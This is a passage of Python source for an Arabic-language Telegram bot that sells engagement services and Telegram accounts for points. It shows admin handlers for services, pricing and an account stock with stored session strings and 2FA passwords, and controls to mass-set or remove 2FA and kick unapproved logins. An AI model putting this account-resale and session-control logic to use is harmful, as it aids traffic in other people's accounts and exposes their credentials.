        menu, mid = rest.rsplit(":", 1)
        mid = int(mid)
        with db_conn() as c:
            items = c.execute("SELECT id, sort_order FROM menu_items WHERE menu=? ORDER BY sort_order, id", (menu,)).fetchall()
            ids = [r["id"] for r in items]
            idx = ids.index(mid) if mid in ids else -1
            swap_idx = idx - 1 if direction == "mb_up" else idx + 1
            if idx != -1 and 0 <= swap_idx < len(ids):
                other_id = ids[swap_idx]
                orders = {r["id"]: r["sort_order"] for r in items}
                c.execute("UPDATE menu_items SET sort_order=? WHERE id=? AND menu=?", (orders[other_id], mid, menu))
                c.execute("UPDATE menu_items SET sort_order=? WHERE id=? AND menu=?", (orders[mid], other_id, menu))
        text, kb = render_mb_menu_screen(menu)
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return

    if data.startswith("mb_width:") and is_own:
        _, rest = data.split(":", 1)
        menu, mid = rest.rsplit(":", 1)
        mid = int(mid)
        with db_conn() as c:
            row = c.execute("SELECT width FROM menu_items WHERE id=? AND menu=?", (mid, menu)).fetchone()
            if row:
                new_width = 1 if row["width"] == 2 else 2
                c.execute("UPDATE menu_items SET width=? WHERE id=? AND menu=?", (new_width, mid, menu))
        await q.answer("✅ تم تغيير الحجم")
        text, kb = render_mb_menu_screen(menu)
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return

    if data.startswith("mb_toggle:") and is_own:
        _, rest = data.split(":", 1)
        menu, mid = rest.rsplit(":", 1)
        mid = int(mid)
        with db_conn() as c:
            row = c.execute("SELECT enabled FROM menu_items WHERE id=? AND menu=?", (mid, menu)).fetchone()
            if row:
                new_enabled = 0 if row["enabled"] else 1
                c.execute("UPDATE menu_items SET enabled=? WHERE id=? AND menu=?", (new_enabled, mid, menu))
        await q.answer("✅ تم التحديث")
        text, kb = render_mb_menu_screen(menu)
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return

    if data.startswith("mb_add:") and is_own:
        menu = data.split(":", 1)[1]
        context.user_data["mb_menu"] = menu
        rows = [
            [InlineKeyboardButton("🔗 رابط خارجي", callback_data="mb_type:url")],
            [InlineKeyboardButton("💬 نص يظهر عند الضغط", callback_data="mb_type:text")],
            [InlineKeyboardButton("↪️ ربط بقسم موجود بالبوت", callback_data="mb_type:goto")],
            [InlineKeyboardButton("👤 تواصل مع المالك (يفتح حسابك الشخصي)", callback_data="mb_type:owner")],
            [InlineKeyboardButton("🔙 رجوع", callback_data=f"mb_menu:{menu}")],
        ]
        await q.edit_message_text("اختر نوع الزر الجديد:", reply_markup=InlineKeyboardMarkup(rows))
        return

    if data.startswith("mb_type:") and is_own:
        mb_type = data.split(":", 1)[1]
        context.user_data["mb_type"] = mb_type
        context.user_data["state"] = "await_mb_label"
        await q.edit_message_text("✏️ أرسل *اسم الزر* الذي سيظهر للمستخدمين:", parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("mb_goto_pick:") and is_own:
        target = data.split(":", 1)[1]
        menu = context.user_data.get("mb_menu")
        label = context.user_data.get("mb_label")
        if not (menu and label):
            await q.edit_message_text("⚠️ انتهت الجلسة، ابدأ من جديد.", reply_markup=owner_settings_kb())
            return
        with db_conn() as c:
            max_order = c.execute("SELECT COALESCE(MAX(sort_order),-1) AS m FROM menu_items WHERE menu=?", (menu,)).fetchone()["m"]
            c.execute(
                "INSERT INTO menu_items (menu,label,action_type,action_value,width,sort_order,enabled) VALUES (?,?,?,?,?,?,1)",
                (menu, label, "goto", target, 2, max_order + 1)
            )
        context.user_data["state"] = "main_menu"
        await q.edit_message_text(f"✅ تمت إضافة الزر '{label}'.",
                                   reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للإدارة", callback_data=f"mb_menu:{menu}")]]))
        return

    if data == "os:add_service" and is_own:
        # الخطوة 1: اختر المنصة
        plat_rows = [[InlineKeyboardButton(lbl, callback_data=f"os_plat:{PLATFORM_MENU_MAP[val]}")] for lbl, val in SERVICE_PLATFORMS]
        plat_rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        await q.edit_message_text(
            "➕ *إضافة خدمة جديدة*\n\nالخطوة 1/3 — اختر *المنصة* التي تريد إضافة الخدمة لها:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(plat_rows)
        )
        return

    if data.startswith("os_plat:") and is_own:
        # الخطوة 2: اختر الفئة
        platform = data.split(":")[1]
        context.user_data["new_svc_platform"] = platform
        plat_label = PLATFORM_LABEL_MAP.get(platform, platform)
        cats = list(CATEGORY_MAP.items())
        rows = [[InlineKeyboardButton(v, callback_data=f"os_cat:{k}")] for k, v in cats]
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:add_service")])
        await q.edit_message_text(
            f"➕ *إضافة خدمة — {plat_label}*\n\nالخطوة 2/3 — اختر *الفئة:*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("os_cat:") and is_own:
        # الخطوة 3: اختر الموقع
        cat = data.split(":")[1]
        context.user_data["new_svc_cat"] = cat
        platform = context.user_data.get("new_svc_platform", "tg")
        plat_label = PLATFORM_LABEL_MAP.get(platform, platform)
        panel_emojis = {1: "1️⃣", 2: "2️⃣", 3: "3️⃣"}
        panel_rows = [
            [InlineKeyboardButton(f"{panel_emojis.get(pid,'➡️')} {pinfo['name']}", callback_data=f"os_panel:{pid}")]
            for pid, pinfo in PANEL_MAP.items() if pinfo["key"]
        ]
        panel_rows.append([InlineKeyboardButton("🔙 رجوع", callback_data=f"os_plat:{platform}")])
        await q.edit_message_text(
            f"📌 المنصة: {plat_label} | الفئة: {CATEGORY_MAP.get(cat, cat)}\n\nالخطوة 3/3 — اختر *الموقع:*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(panel_rows)
        )
        return

    if data.startswith("os_panel:") and is_own:
        panel = int(data.split(":")[1])
        context.user_data["new_svc_panel"] = panel
        context.user_data["state"] = "os_await_api_id"
        site_name = PANEL_MAP.get(panel, PANEL_MAP[1])["name"]
        await q.edit_message_text(
            f"🌐 الموقع: {site_name}\n\nأرسل *رقم الخدمة* في هذا الموقع:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    # ── أزرار inline لاختيار القيم عند إضافة خدمة ──
    if data.startswith("os_use_min:") and is_own:
        mn = int(data.split(":")[1])
        context.user_data["new_svc_min"] = mn
        info = context.user_data.get("new_svc_info", {})
        mx   = info.get("max", 0)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"✅ استخدم ({mx})", callback_data=f"os_use_max:{mx}")]
        ])
        await q.edit_message_text(
            f"✅ الحد الأدنى: {mn}\n\n"
            f"📈 *الحد الأعلى من الموقع: {mx}*\n\nاضغط الزر لاستخدامه أو أرسل رقماً مختلفاً:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb
        )
        context.user_data["state"] = "os_await_max"
        return

    if data.startswith("os_use_max:") and is_own:
        mx = int(data.split(":")[1])
        context.user_data["new_svc_max"] = mx
        info = context.user_data.get("new_svc_info", {})
        rate = float(info.get("rate", 0))
        suggested = round(rate * 100000, 1)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"✅ استخدم ({suggested} نقطة/1000 وحدة)", callback_data=f"os_use_price:{suggested}")]
        ])
        await q.edit_message_text(
            f"✅ الحد الأعلى: {mx}\n\n"
            f"💰 *السعر المقترح: {suggested} نقطة/1000 وحدة*\n"
            f"_(محسوب: {rate}$ × 100)_\n\n"
            f"اضغط الزر لاستخدامه أو أرسل رقماً مختلفاً:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb
        )
        context.user_data["state"] = "os_await_price"
        return

    if data.startswith("os_use_price:") and is_own:
        price    = float(data.split(":")[1])
        context.user_data["state"] = "main_menu"
        cat      = context.user_data.get("new_svc_cat", "followers")
        api_id   = context.user_data.get("new_svc_api_id")
        panel    = context.user_data.get("new_svc_panel", 1)
        platform = context.user_data.get("new_svc_platform", "tg")
        name     = context.user_data.get("new_svc_name")
        mn       = context.user_data.get("new_svc_min", 0)
        mx_val   = context.user_data.get("new_svc_max", 0)
        desc     = context.user_data.get("new_svc_desc", "")
        with db_conn() as c:
            c.execute(
                "INSERT INTO services (category,api_service_id,panel,platform,name_ar,description,min_qty,max_qty,price_per_point) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)",
                (cat, api_id, panel, platform, name, desc, mn, mx_val, price)
            )
        site_name  = PANEL_MAP.get(panel, PANEL_MAP[1])["name"]
        plat_label = PLATFORM_LABEL_MAP.get(platform, platform)
        await q.edit_message_text(
            f"✅ تمت إضافة الخدمة *'{name}'* بنجاح!\n\n"
            f"📱 المنصة: {plat_label}\n"
            f"🌐 الموقع: {site_name}\n"
            f"📉 الحد الأدنى: {mn}\n"
            f"📈 الحد الأعلى: {mx_val}\n"
            f"💰 السعر: {fmt_price(price)} نقطة/1000 وحدة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    if data == "os:view_services" and is_own:
        # الخطوة 1: اختر المنصة
        rows = []
        for lbl, val in SERVICE_PLATFORMS:
            plat_code = PLATFORM_MENU_MAP[val]
            with db_conn() as c:
                cnt = c.execute("SELECT COUNT(*) AS n FROM services WHERE platform=%s", (plat_code,)).fetchone()
            n = cnt["n"] if cnt else 0
            rows.append([InlineKeyboardButton(f"{lbl} ({n})", callback_data=f"os_view_plat:{plat_code}")])
        with db_conn() as c:
            total = c.execute("SELECT COUNT(*) AS n FROM services").fetchone()
        rows.append([InlineKeyboardButton(f"📂 جميع المنصات ({total['n'] if total else 0})", callback_data="os_view_plat:ALL")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        await q.edit_message_text(
            "🗂 *عرض الخدمات — اختر المنصة:*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("os_view_plat:") and is_own:
        # الخطوة 2: اختر الفئة (مفلترة حسب المنصة)
        platform = data.split(":", 1)[1]   # "tg" / "ig" / ... / "ALL"
        rows = []
        for cat_key, cat_name in CATEGORY_MAP.items():
            with db_conn() as c:
                if platform == "ALL":
                    cnt = c.execute("SELECT COUNT(*) AS n FROM services WHERE category=%s", (cat_key,)).fetchone()
                else:
                    cnt = c.execute("SELECT COUNT(*) AS n FROM services WHERE category=%s AND platform=%s", (cat_key, platform)).fetchone()
            n = cnt["n"] if cnt else 0
            if n == 0:
                continue
            rows.append([InlineKeyboardButton(f"{cat_name} ({n})", callback_data=f"os_view_cat:{platform}:{cat_key}")])
        rows.append([InlineKeyboardButton("📂 عرض الجميع", callback_data=f"os_view_cat:{platform}:ALL")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:view_services")])
        plat_label = "جميع المنصات" if platform == "ALL" else PLATFORM_LABEL_MAP.get(platform, platform)
        await q.edit_message_text(
            f"🗂 *عرض الخدمات — {plat_label}*\nاختر الفئة:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("os_view_cat:") and is_own:
        # دعم الصيغتين: القديمة os_view_cat:{cat} والجديدة os_view_cat:{platform}:{cat}
        rest = data[len("os_view_cat:"):]
        if ":" in rest:
            platform, cat_filter = rest.split(":", 1)
        else:
            platform, cat_filter = "ALL", rest
        if cat_filter == "ALL":
            cats_to_show = list(CATEGORY_MAP.items())
        else:
            cats_to_show = [(cat_filter, CATEGORY_MAP.get(cat_filter, cat_filter))]
        sent_any = False
        first = True
        for cat_key, cat_name in cats_to_show:
            with db_conn() as c:
                if platform == "ALL":
                    svcs = c.execute("SELECT * FROM services WHERE category=%s ORDER BY platform, id", (cat_key,)).fetchall()
                else:
                    svcs = c.execute("SELECT * FROM services WHERE category=%s AND platform=%s ORDER BY id", (cat_key, platform)).fetchall()
            if not svcs:
                continue
            sent_any = True
            for s in svcs:
                status     = "✅ مفعّلة" if s["active"] else "❌ معطّلة"
                site_name  = PANEL_MAP.get(s["panel"] or 1, PANEL_MAP[1])["name"]
                plat_label = PLATFORM_LABEL_MAP.get(s.get("platform") or "tg", "📱 تيلجرام")
                svc_text = (
                    f"📂 *{cat_name}*\n"
                    f"🔹 *{s['name_ar']}*\n\n"
                    f"🟢 الحالة: {status}\n"
                    f"📱 المنصة: {plat_label}\n"
                    f"🌐 الموقع: {site_name} (رقم: {s['api_service_id']})\n"
                    f"📝 الوصف: {s['description'] or '—'}\n"
                    f"📉 الحد الأدنى: {s['min_qty']:,}\n"
                    f"📈 الحد الأعلى: {s['max_qty']:,}\n"
                    f"💰 السعر: {fmt_price(s['price_per_point'])} نقطة / 1000 وحدة\n"
                )
                tog = "❌ تعطيل" if s["active"] else "✅ تفعيل"
                back_cb = f"os_view_plat:{platform}"
                svc_kb = InlineKeyboardMarkup([
                    [InlineKeyboardButton("✏️ تعديل", callback_data=f"os_edit_svc:{s['id']}"),
                     InlineKeyboardButton(tog, callback_data=f"os_tog_svc:{s['id']}:{0 if s['active'] else 1}"),
                     InlineKeyboardButton("🗑 حذف", callback_data=f"os_del_svc:{s['id']}")],
                ])
                if first and update.callback_query:
                    await q.edit_message_text(svc_text, parse_mode=ParseMode.MARKDOWN, reply_markup=svc_kb)
                    first = False
                else:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=svc_text,
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=svc_kb
                    )
        if not sent_any:
            cat_name   = "الجميع" if cat_filter == "ALL" else CATEGORY_MAP.get(cat_filter, cat_filter)
            plat_label = "جميع المنصات" if platform == "ALL" else PLATFORM_LABEL_MAP.get(platform, platform)
            msg = f"📋 لا توجد خدمات في فئة ({cat_name}) للمنصة ({plat_label})."
            if first and update.callback_query:
                await q.edit_message_text(msg, reply_markup=owner_settings_kb())
            else:
                await context.bot.send_message(update.effective_chat.id, msg)
        else:
            back_cb = f"os_view_plat:{platform}"
            await context.bot.send_message(
                update.effective_chat.id,
                "⬆️ هذه جميع الخدمات المطلوبة.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للعرض", callback_data=back_cb),
                                                    InlineKeyboardButton("⚙️ الإعدادات", callback_data="owner_settings")]])
            )
        return

    if data == "os:orders_section" and is_own:
        await show_orders_section(update, context, offset=0)
        return

    if data.startswith("os:orders_page:") and is_own:
        offset = int(data.split(":")[2])
        await show_orders_section(update, context, offset=offset)
        return

    if data == "os:order_lookup" and is_own:
        context.user_data["state"] = "os_await_order_lookup"
        await q.edit_message_text("🔍 أرسل كود الطلب الذي تريد عرض تفاصيله:")
        return

    if data == "os:list_services" and is_own:
        text_, rows = _render_service_list()
        if rows is None:
            await q.edit_message_text(text_, reply_markup=owner_settings_kb())
            return
        await q.edit_message_text(text_, parse_mode=ParseMode.MARKDOWN,
                                   reply_markup=InlineKeyboardMarkup(rows))
        return

    if data.startswith("os_tog_svc:") and is_own:
        _, sid, val = data.split(":")
        with db_conn() as c:
            c.execute("UPDATE services SET active=? WHERE id=?", (int(val), int(sid)))
        await q.answer("✅ تم التحديث")
        text_, rows = _render_service_list()
        if rows is None:
            await q.edit_message_text(text_, reply_markup=owner_settings_kb())
            return
        await q.edit_message_text(text_, parse_mode=ParseMode.MARKDOWN,
                                   reply_markup=InlineKeyboardMarkup(rows))
        return

    # ── تعديل خدمة ──
    if data.startswith("os_edit_svc:") and is_own:
        sid = int(data.split(":")[1])
        with db_conn() as c:
            svc = c.execute("SELECT * FROM services WHERE id=?", (sid,)).fetchone()
        if not svc:
            await q.answer("⚠️ الخدمة غير موجودة")
            return
        site_name = PANEL_MAP.get(svc["panel"] or 1, PANEL_MAP[1])["name"]
        rows = [
            [InlineKeyboardButton("✏️ الاسم", callback_data=f"os_edit_field:{sid}:name"),
             InlineKeyboardButton("📉 الحد الأدنى", callback_data=f"os_edit_field:{sid}:min")],
            [InlineKeyboardButton("📈 الحد الأعلى", callback_data=f"os_edit_field:{sid}:max"),
             InlineKeyboardButton("💰 السعر", callback_data=f"os_edit_field:{sid}:price")],
            [InlineKeyboardButton("📝 الوصف", callback_data=f"os_edit_field:{sid}:desc")],
            [InlineKeyboardButton("🌐 الموقع ورقم الخدمة", callback_data=f"os_edit_field:{sid}:source")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="os:list_services")],
        ]
        await q.edit_message_text(
            f"✏️ *تعديل الخدمة:* {svc['name_ar']}\n\n"
            f"🌐 الموقع الحالي: {site_name} (رقم {svc['api_service_id']})\n"
            f"📉 الحد الأدنى: {svc['min_qty']}\n"
            f"📈 الحد الأعلى: {svc['max_qty']}\n"
            f"💰 السعر: {fmt_price(svc['price_per_point'])} نقطة/1000\n"
            f"📝 الوصف: {svc['description'] or '—'}\n\n"
            f"اختر ما تريد تعديله:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("os_edit_field:") and is_own:
        _, sid, field = data.split(":")
        context.user_data["edit_svc_id"] = int(sid)
        prompts = {
            "name":  ("✏️ أرسل *الاسم الجديد بالعربية* للخدمة:", "os_edit_await_name"),
            "min":   ("📉 أرسل *الحد الأدنى* الجديد:", "os_edit_await_min"),
            "max":   ("📈 أرسل *الحد الأعلى* الجديد:", "os_edit_await_max"),
            "price": ("💰 أرسل *السعر* الجديد (نقطة/1000 وحدة):", "os_edit_await_price"),
            "desc":  ("📝 أرسل *الوصف الجديد* للخدمة (أو أرسل `-` لحذف الوصف):", "os_edit_await_desc"),
        }
        if field == "source":
            rows = [
                [InlineKeyboardButton(f"1️⃣ {PANEL_MAP[1]['name']}", callback_data=f"os_edit_panel:{sid}:1")],
                [InlineKeyboardButton(f"2️⃣ {PANEL_MAP[2]['name']}", callback_data=f"os_edit_panel:{sid}:2")],
                [InlineKeyboardButton("🔙 رجوع", callback_data=f"os_edit_svc:{sid}")],
            ]
            await q.edit_message_text(
                "🌐 اختر *الموقع الجديد* الذي تريد ربط الخدمة به:",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(rows)
            )
            return
        msg, state_name = prompts[field]
        context.user_data["state"] = state_name
        await q.edit_message_text(msg, parse_mode=ParseMode.MARKDOWN)
        return

    if data.startswith("os_edit_panel:") and is_own:
        _, sid, panel = data.split(":")
        context.user_data["edit_svc_id"] = int(sid)
        context.user_data["edit_svc_panel"] = int(panel)
        context.user_data["state"] = "os_edit_await_apiid"
        site_name = PANEL_MAP.get(int(panel), PANEL_MAP[1])["name"]
        await q.edit_message_text(
            f"🌐 الموقع: {site_name}\n\nأرسل *رقم الخدمة الجديد* في هذا الموقع:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data.startswith("os_del_svc:") and is_own:
        sid = int(data.split(":")[1])
        with db_conn() as c:
            svc = c.execute("SELECT * FROM services WHERE id=?", (sid,)).fetchone()
        if not svc:
            await q.answer("⚠️ الخدمة غير موجودة")
            return
        await q.edit_message_text(
            f"🗑 *تأكيد الحذف:*\n\n"
            f"هل أنت متأكد من حذف الخدمة:\n"
            f"*{svc['name_ar']}*؟\n\n"
            f"⚠️ لا يمكن التراجع عن هذا الإجراء!",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ نعم، احذف", callback_data=f"os_confirm_del:{sid}"),
                 InlineKeyboardButton("❌ إلغاء", callback_data="os:list_services")]
            ])
        )
        return

    if data.startswith("os_confirm_del:") and is_own:
        sid = int(data.split(":")[1])
        with db_conn() as c:
            svc = c.execute("SELECT name_ar FROM services WHERE id=?", (sid,)).fetchone()
            c.execute("DELETE FROM services WHERE id=?", (sid,))
        name = svc["name_ar"] if svc else "الخدمة"
        await q.edit_message_text(
            f"✅ تم حذف الخدمة *'{name}'* بنجاح.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_settings_kb()
        )
        return

    if data == "os:edit_gift" and is_own:
        context.user_data["state"] = "os_await_gift_val"
        cur = get_setting("daily_gift_points") or "50"
        await q.edit_message_text(f"🎁 الهدية الحالية: {cur} نقطة\n\nأرسل القيمة الجديدة:")
        return

    if data == "os:edit_referral" and is_own:
        context.user_data["state"] = "os_await_referral_val"
        cur = get_setting("referral_points") or "30"
        await q.edit_message_text(f"🔗 نقاط الدعوة الحالية: {cur} نقطة\n\nأرسل القيمة الجديدة:")
        return

    if data == "os:edit_star_rate" and is_own:
        context.user_data["state"] = "os_await_star_rate"
        cur = get_setting("star_to_points") or "250"
        await q.edit_message_text(f"⭐ سعر النجمة (شحن) الحالي: {cur} نقطة\n\nأرسل القيمة الجديدة:")
        return

    if data == "os:edit_exchange_rate" and is_own:
        context.user_data["state"] = "os_await_exchange_rate"
        cur = get_setting("exchange_star_rate") or "2000"
        await q.edit_message_text(f"🏆 سعر نجمة الجوائز الحالي: {cur} نقطة\n\nأرسل القيمة الجديدة:")
        return

    if data == "os:edit_exchange_msg" and is_own:
        context.user_data["state"] = "os_await_exchange_msg"
        cur = get_setting("exchange_success_msg") or "(لا توجد رسالة مضافة حالياً)"
        await q.edit_message_text(
            f"✏️ الرسالة الحالية التي تظهر عند الاستبدال:\n\n{cur}\n\n"
            f"أرسل الرسالة الجديدة (ستظهر لكل مستخدم قبل كود عمليته تلقائياً):"
        )
        return

    # ── مخزون أرقام تيلغرام (تسليم تلقائي) ──
    if data == "os:manage_numbers" and is_own:
        avail = get_available_number_count()
        await q.edit_message_text(
            "📥 *مخزون أرقام تيلغرام*\n\n"
            f"📦 الأرقام المتاحة حالياً: *{avail}*\n\n"
            "عندما يشتري عضو رقماً وهناك مخزون متاح، يُسلَّم له تلقائياً وفوراً بدون أي تدخل منك.\n"
            "إذا نفد المخزون، يعود الطلب لطريقة التواصل اليدوي كما هو معتاد.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔑 تسجيل دخول رقم جديد (تلقائي بالكامل)", callback_data="os:login_number")],
                [InlineKeyboardButton("📋 قائمة الأرقام ومعلوماتها", callback_data="os:list_numbers")],
                [InlineKeyboardButton("🔍 فحص جميع الحسابات الآن", callback_data="os:scan_all_numbers")],
                [InlineKeyboardButton("➕ إضافة أرقام بدون تسجيل دخول (يدوي)", callback_data="os:add_numbers")],
                [InlineKeyboardButton("🔄 إرجاع جميع الأرقام المباعة للبيع", callback_data="os:release_all_numbers")],
                [InlineKeyboardButton("🔍 فحص جاهزية الأرقام (كود + 2FA)", callback_data="os:check_readiness")],
                [InlineKeyboardButton("🗑️ حذف الأرقام اليدوية + تعويض المشترين", callback_data="os:delete_manual_numbers")],
                [InlineKeyboardButton("🔑 تعيين كلمة مرور 'محمد' لجميع الحسابات", callback_data="os:set_all_2fa_muhammed")],
                [InlineKeyboardButton("🔓 إزالة التحقق (2FA) من ملفات جلسة", callback_data="os:remove_2fa_mode")],
                [InlineKeyboardButton("🤝 مهام الإحالة التلقائية", callback_data="os:ref_tasks")],
                [InlineKeyboardButton("🔎 بحث برقم هاتف", callback_data="os:phone_search")],
                [InlineKeyboardButton("🛒 الحسابات المبيوعة", callback_data="os:sold_accounts")],
                [InlineKeyboardButton("⚠️ تعويض المظلومين / العمليات الفاشلة", callback_data="os:failed_deliveries")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")],
            ])
        )
        return


    if data == "os:check_readiness" and is_own:
        with db_conn() as c:
            rows = c.execute(
                "SELECT phone_number, session_string, twofa_password, last_authorized, deleted_at "
                "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL ORDER BY id ASC"
            ).fetchall()
        total = len(rows)
        full_ready   = []  # session + 2FA
        session_only = []  # session but no 2FA
        no_session   = []  # no session (manual/kicked)
        for r in rows:
            has_session = bool(r["session_string"]) and r.get("last_authorized") is not False
            has_twofa   = bool((r["twofa_password"] or "").strip())
            if has_session and has_twofa:
                full_ready.append(r["phone_number"])
            elif has_session:
                session_only.append(r["phone_number"])
            else:
                no_session.append(r["phone_number"])

        lines = [f"🔍 *فحص جاهزية الأرقام ({total} رقم)*\n"]
        lines.append(
            f"✅ *جاهز بالكامل (كود + 2FA): {len(full_ready)}*\n"
            + ("\n".join(f"   • `{p}`" for p in full_ready[:20])
               + (f"\n   _(+{len(full_ready)-20} آخرين)_" if len(full_ready) > 20 else ""))
            if full_ready else "✅ *جاهز بالكامل:* لا يوجد"
        )
        lines.append("")
        lines.append(
            f"⚠️ *يملك جلسة فقط (بدون 2FA): {len(session_only)}*\n"
            + ("\n".join(f"   • `{p}`" for p in session_only[:20])
               + (f"\n   _(+{len(session_only)-20} آخرين)_" if len(session_only) > 20 else ""))
            if session_only else "⚠️ *بدون 2FA:* لا يوجد"
        )
        lines.append("")
        lines.append(
            f"❌ *بدون جلسة (لا كود ولا 2FA): {len(no_session)}*\n"
            + ("\n".join(f"   • `{p}`" for p in no_session[:20])
               + (f"\n   _(+{len(no_session)-20} آخرين)_" if len(no_session) > 20 else ""))
            if no_session else "❌ *بدون جلسة:* لا يوجد"
        )
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")],
            ])
        )
        return

    if data == "os:delete_manual_numbers" and is_own:
        with db_conn() as c:
            # الأرقام اليدوية = بدون session_string في المخزون (غير محذوفة)
            manual_rows = c.execute(
                "SELECT id, phone_number, assigned_to FROM number_stock "
                "WHERE session_string IS NULL AND deleted_at IS NULL"
            ).fetchall()

            if not manual_rows:
                await q.answer("✅ لا توجد أرقام يدوية في المخزون.", show_alert=True)
                return

            deleted_count  = 0
            compensated    = 0
            buyers_notified = []

            for row in manual_rows:
                phone = row["phone_number"]
                # ابحث عن آخر عملية شراء مكتملة لهذا الرقم غير معوَّضة مسبقاً
                pe = c.execute(
                    "SELECT id, user_id, points_cost, compensated_at FROM prize_exchanges "
                    "WHERE prize_value=%s AND prize_type IN ('telegram_number','telegram_number_code') "
                    "AND status='completed' ORDER BY id DESC LIMIT 1",
                    (phone,)
                ).fetchone()

                # احذف الرقم (soft delete)
                c.execute(
                    "UPDATE number_stock SET deleted_at=NOW(), assigned_to=NULL, assigned_at=NULL WHERE id=%s",
                    (row["id"],)
                )
                deleted_count += 1

                if pe and pe["points_cost"]:
                    # تحقق أنه لم يُعوَّض مسبقاً
                    if pe["compensated_at"]:
                        logger.info(f"⏭ delete_manual_numbers: {phone} عُوِّض مسبقاً، تخطّي.")
                        continue
                    pts = pe["points_cost"]
                    uid = pe["user_id"]
                    pe_id_m = pe["id"]
                    # تسجيل ذري — إذا سُبقنا لا نُضيف نقاطاً
                    rows_m = c.execute(
                        "UPDATE prize_exchanges SET "
                        "compensated_at=NOW(), compensated_pts=%s, compensated_reason='manual_number_deleted' "
                        "WHERE id=%s AND compensated_at IS NULL",
                        (pts, pe_id_m)
                    ).rowcount
                    if rows_m == 0:
                        continue
                    add_points(uid, pts)
                    compensated += 1
                    buyers_notified.append((uid, phone, pts))

        # أبلغ كل مشترٍ عُوِّض
        for uid, phone, pts in buyers_notified:
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=(
                        f"💰 *إشعار تعويض*\n"
                        f"{'─' * 28}\n\n"
                        f"عزيزي العميل،\n"
                        f"الرقم الذي حصلت عليه `{phone}` تبيّن أنه أُضيف يدوياً "
                        f"ولا يضمن وصولك الكامل للحساب (بدون جلسة أو 2FA).\n\n"
                        f"✅ *تم تعويضك فوراً بـ {pts:,} نقطة* أُضيفت لرصيدك.\n\n"
                        f"يمكنك استخدامها لشراء رقم جديد متاح بالكامل.\n"
                        f"نعتذر عن الإزعاج 🙏"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass

        summary = (
            f"🗑️ *تم حذف {deleted_count} رقم يدوي*\n\n"
            f"💰 *عُوِّض {compensated} مشترٍ* وأُعيدت لهم نقاطهم كاملةً.\n"
        )
        if deleted_count - compensated > 0:
            summary += f"📦 *{deleted_count - compensated}* رقم لم يُباع (لا يحتاج تعويض)."

        await q.edit_message_text(
            summary,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع للمخزون", callback_data="os:manage_numbers")],
            ])
        )
        return

    # ── سماح 5 دقائق لدخول جديد ──
    if data.startswith("os:allow_5min:") and is_own:
        _phone_allow = data[len("os:allow_5min:"):]
        _allow_5min_phones[_phone_allow] = {"until": time.time() + 300, "used": False}
        await q.answer("✅ رُفعت الحراسة — أول دخول خلال 5 دقائق يُسمح له ويبقى للأبد.")
        await q.edit_message_text(
            f"✅ *نافذة سماح 5 دقائق مفتوحة*\n\n"
            f"📱 الرقم: `{_phone_allow}`\n\n"
            f"• الشخص *الأول* الذي يدخل خلال 5 دقائق يبقى *للأبد* — لن يُطرد.\n"
            f"• أي دخول *ثانٍ* يُطرد فوراً حتى لو في نفس الوقت.\n"
            f"• إذا انتهت الدقائق الخمس قبل الدخول، يعود الطرد الفوري لأي جلسة جديدة.\n"
            f"• عند بيع الحساب: الشخص المسموح له يُطرد تلقائياً والمشتري يبقى وحده.",
            parse_mode=ParseMode.MARKDOWN
        )
        # تنظيف تلقائي بعد 5 دقائق إذا لم تُستخدم
        async def _expire_allow(ph):
            await asyncio.sleep(305)
            _allow_5min_phones.pop(ph, None)
        asyncio.create_task(_expire_allow(_phone_allow))
        return

    # ── معلومات الحساب ──
    if data.startswith("os:account_info:") and is_own:
        _phone_info = data[len("os:account_info:"):]
        await q.answer()
        try:
            with db_conn() as _ci:
                _row_info = _ci.execute(
